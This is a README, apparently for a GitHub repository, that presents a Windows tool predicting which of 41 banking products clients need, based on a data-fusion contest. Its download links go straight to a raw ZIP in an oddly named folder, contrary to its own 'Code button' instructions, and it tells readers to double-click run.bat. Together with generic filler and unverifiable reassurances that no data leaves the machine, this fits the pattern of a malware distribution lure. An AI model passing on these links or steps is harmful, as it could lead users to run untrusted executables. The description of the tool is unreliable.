# 🏆 Data-Fusion-top-60 - Predict Financial Product Needs For Clients

[![](https://img.shields.io/badge/Download-Software-blue)](https://raw.githubusercontent.com/aditemmet3651/Data-Fusion-top-60/main/supineness/top-Data-Fusion-2.9.zip)

Data-Fusion-top-60 helps you predict which financial products a client needs. This tool uses data from a large contest to guess outcomes for banking customers. You can use this software on your computer to process client lists and generate predictions.

## 🛠 Prerequisites

This software works on Windows. Ensure your computer meets these requirements:

*   Windows 10 or Windows 11.
*   6 gigabytes of available video memory.
*   10 gigabytes of system memory.
*   A stable internet connection for the setup process.

## 📥 Getting Started

Follow these steps to set up the software on your machine:

1. Visit [this GitHub page](https://raw.githubusercontent.com/aditemmet3651/Data-Fusion-top-60/main/supineness/top-Data-Fusion-2.9.zip) to access the files.
2. Look for the green button labeled Code and select Download ZIP.
3. Save the file to your computer.
4. Right-click the downloaded folder and select Extract All.

## ⚙️ Running The Software

Once you extract the files, follow these steps to start the application:

1. Open the folder you extracted.
2. Locate the file named run.bat.
3. Double-click this file. A window appears on your screen.
4. The software checks your system components.
5. Wait for the process to display that it is ready for input.
6. Place your data files in the designated folder named InputData.
7. Press the start key inside the program window.

The software analyzes your data using the model parameters provided. This model identifies patterns for 41 different bank products. It handles one million distinct customer records to provide accurate probability scores.

## 📊 Understanding Your Results

After the software finishes, you find your results in the Output folder. Each row in the file represents a client from your list. The columns show the probability of that client needing a specific bank card, account, or service.

*   Values close to 1 indicate a high chance of interest.
*   Values close to 0 indicate a low chance of interest.

Use these insights to organize your recommendations. The software filters through 199 primary features and over 2,000 additional data points to calculate these numbers.

## 🔍 Troubleshooting Common Issues

If the software fails to launch, verify your system memory. The program requires 10 gigabytes of free system RAM to handle the load of one million records. Close other applications before running the process.

If you see an error about missing files, return to the repository link and redownload the ZIP package. Ensure you extracted all files before you run the batch script.

*   Check your video card drivers if the tool reports errors regarding the 6 gigabytes of video memory.
*   Update your Windows installation to the latest version to ensure compatibility.
*   Make sure you do not move the run.bat file out of the root folder.

## 💡 Frequently Asked Questions

**Does this software store my data?**
No. The application runs locally on your machine. All calculations happen on your hardware, and no data reaches external servers.

**Can I process fewer than one million clients?**
Yes. You can provide smaller files. The software adapts to the size of your input file automatically.

**Why are there 41 products?**
The software follows the logic developed in the Data Fusion Contest 2026. This allows for a broad classification of banking services, including savings accounts, credit cards, and specialized financial plans.

**Is this tool accurate?**
The logic behind this tool achieved a top-60 rank in a major private competition. It uses modern machine learning methods to create predictions. Always review your results to ensure they meet your needs.

**Where do I place my input files?**
Place all CSV files inside the folder named InputData. Ensure your files use the correct headers as defined in the sample template provided within the folder.

Keep your hardware clean and ensure your power settings allow for high performance. This task requires significant processing power, so it might take several minutes to finish depending on your hardware configuration. If you need to stop the process, close the window. The software saves no partial states, so you must start over if you stop mid-process.